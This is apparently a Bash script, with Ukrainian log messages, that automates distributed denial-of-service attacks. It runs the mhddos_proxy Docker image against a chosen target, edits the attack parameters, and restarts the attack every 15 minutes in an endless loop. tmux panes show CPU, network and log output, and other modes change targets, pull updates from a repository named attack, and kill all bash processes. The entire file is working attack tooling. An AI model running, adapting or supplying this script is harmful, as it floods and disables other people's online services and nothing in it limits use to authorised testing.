clear
logfile="/var/log/attack.log"
mode=$1  
command=$2
parameter=$3

function prepare_command {
        command=${command#"docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "}
        command=${command%" -t 1000 -p 1200 --rpc 1000 --debug"}
        command="docker run -i --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest "$command" -t "$parameter" -p 900 --rpc 1000 --table"
        echo "$command" > /var/tmp/attack_target
}

function create_environment {
        tmux new-session -s attack -d
        tmux split-window -t attack -h -p 50
        tmux split-window -t attack -v -p 66
        tmux split-window -t attack -v -p 50
}

function fill_environment {
        tmux select-window -t attack
        tmux send-keys -t 1 'htop' Enter
        tmux send-keys -t 2 'nload eth0' Enter
        tmux send-keys -t 3 'tail -f ' "$logfile" Enter
}

function write_to_log {
        echo "$(date "+%d.%m.%Y %H:%M:%S")" "$1" >> $logfile
}

function kill_environment {
        tmux select-window -t attack
        tmux send-keys -t 0 C-c Enter
        tmux kill-session
        rm /var/tmp/attack_target
        pkill -KILL bash &
        systemctl restart docker.service
}


function attack {
        command=$(</var/tmp/attack_target)
        tmux select-window -t attack & tmux send-keys -t 0 "$command" Enter & sleep 900 && tmux send-keys -t 0 C-c Enter && sleep 5 && tmux send-keys -t 0 "systemctl restart docker.service" Enter
}

function update {
        echo 'Зупиняю роботу скриптів' 
        tmux select-window -t attack &
        tmux send-keys -t 0 C-c Enter &
        echo 'Виконую оновлення скриптів'
        cd ~/
        rm -rf ~/attack &
        git clone -b testing https://github.com/va1d3mar/attack.git &
        cd ~/attack &
        echo 'Оновлення завершено'
        write_to_log 'Проведено оновлення скриптів з Github'
        kill_environment &
}

case $mode in
        attack)
        write_to_log 'Аналізую команду'
        prepare_command
        write_to_log 'Команда відредагована'
        create_environment
        write_to_log 'Нове оточення створено'
        fill_environment
        write_to_log 'Нове оточення наповнено'
        while true
        do
                write_to_log 'Розпочинаю цикл атаки'
                attack
                write_to_log 'Цикл атаки завершено, докер перезапущено, шоб не висло'
        done
                ;;

        halt)
        write_to_log 'Завершення роботи оточення'
        kill_environment
                ;;

        change)
        write_to_log 'Змінюю ціль'
        prepare_command
                ;;

        update)
        update
                ;;
                
        *)
        write_to_log 'Йа нєпанімаю ваш язік. Пішітє правельно!'
        echo "Йа нєпанімаю ваш язік. Пішітє правельно!"
        ;;
esac